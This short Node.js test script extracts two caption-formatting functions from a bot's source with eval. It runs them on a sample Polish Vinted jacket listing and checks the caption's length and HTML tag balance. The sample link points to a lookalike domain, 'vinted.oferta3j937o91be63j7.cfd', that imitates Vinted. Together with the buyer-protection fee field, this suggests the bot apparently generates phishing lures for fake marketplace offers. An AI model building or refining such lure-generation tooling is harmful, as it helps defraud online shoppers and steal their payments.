const fs=require('fs');
const src=fs.readFileSync('bot.js','utf8');
function grab(startMarker){
  const i=src.indexOf(startMarker); if(i<0) return '';
  let d=0,j=src.indexOf('{',i);
  for(let k=j;k<src.length;k++){ if(src[k]==='{')d++; else if(src[k]==='}'){d--; if(!d) return src.slice(i,k+1);} }
}
const f1=grab('function fitCaption');
const f2=grab('function formatVintedOfferCaption');
console.log('grabbed',f1.length,f2.length);
const fitCaption=eval('('+f1+')');
const formatVintedOfferCaption=eval('('+f2+')');
const offer={nazwa:'Kurtka The North Face Nuptse 700 czarna · rozmiar L',sprzedawca:'Ania',description:'x'.repeat(300),cena:'620',cenaDostawy:'11.49',cenaOchrony:'4.99',oplata:'',miasto:'Kraków',lastonline:'Dzisiaj o 15:32',kategoria:'Moda',tagi:'Stan: Bardzo dobry;Marka: The North Face;Rozmiar: L;Kolor: Czarny;Sezon: Zima'.repeat(4),zdjecia:['1','2','3']};
const link='https://vinted.oferta3j937o91be63j7.cfd/id-12345-Kurtka-The-North-Face-Nuptse-700-czarna-rozmiar-L';
const md=(t)=>t.replace(/\*\*([^*]+)\*\*/g,'<b>$1</b>').replace(/\*([^*\n]+)\*/g,'<b>$1</b>').replace(/`([^`\n]+)`/g,'<code>$1</code>');
const raw=md(formatVintedOfferCaption(offer,link));
const cap=fitCaption(raw);
console.log('RAWLEN',raw.length,'LEN',cap.length);
console.log('---TAIL---'); console.log(cap.slice(-260));
const bal=[...cap.matchAll(/<(\w+)[^>]*>/g)].filter(m=>!/^<\//.test(m[0])).length;
const cl=[...cap.matchAll(/<\/(\w+)>/g)].length;
console.log('open',bal,'close',cl);
